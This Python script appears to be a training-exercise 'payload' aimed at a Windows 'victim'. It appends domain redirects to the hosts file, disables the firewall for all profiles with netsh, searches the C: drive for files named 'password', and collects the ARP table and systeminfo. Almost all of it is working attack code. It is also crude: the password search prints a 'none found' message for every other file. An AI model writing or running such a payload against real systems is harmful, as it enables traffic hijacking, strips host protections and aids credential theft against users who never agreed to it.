#!/usr/bin/python3

# Ex: create the 2nd function in your payload to create inside the host’s file (system32/drivers/etc/hosts) a new domain with a given IP redirection.
# Ex: Create the 3rd function in your payload to disable the FW using the netsh command.
# Ex: Create the 4th function in your payload that searches for files named ‘password’.
# Ex: Create the 5th function in your payload that displays the victim’s ARP table and ‘systeminfo’.


#Function 2: Add domain to host file
import os

def display_hosts_file():
    with open(os.path.join("C:/Windows/System32/drivers/etc/hosts"), "r") as hosts_file:
        print("\nCurrent contents of the hosts file:")
        print(hosts_file.read())

redirect_ip = input("Enter the redirect IP address: ")
redirect_domain = input("Enter the domain to redirect: ")

# Display the hosts file before the redirect entry is added
display_hosts_file()

# Open the hosts file in append mode
with open(os.path.join("C:/Windows/System32/drivers/etc/hosts"), "a") as hosts_file:
    # Add the redirect entry to the hosts file
    hosts_file.write(f"\n{redirect_ip}    {redirect_domain}")

# Display the hosts file after the redirect entry is added
display_hosts_file()


#Function 3: Disable Firewall

def disable_firewall():
    os.system('cmd /k "netsh advfirewall set allprofiles state off"')

disable_firewall()
#Function 4: Search for files named 'password'

def search_passwords():
    for root, dirs, files in os.walk('C:\\'):
        for file in files:
            if file == 'password':
                print('Found password file: ' + file + ' in ' + root)   #Print the file name and the directory it was found in
            elif file != 'password':
                print('No password files found')

search_passwords()      
#Function 5: Display ARP table and systeminfo

def display_arp():
    os.system('cmd /k "arp -a"') #Display the ARP table
    os.system('cmd /k "systeminfo"') #Display system information

display_arp()
#EOF script.py #End of file 
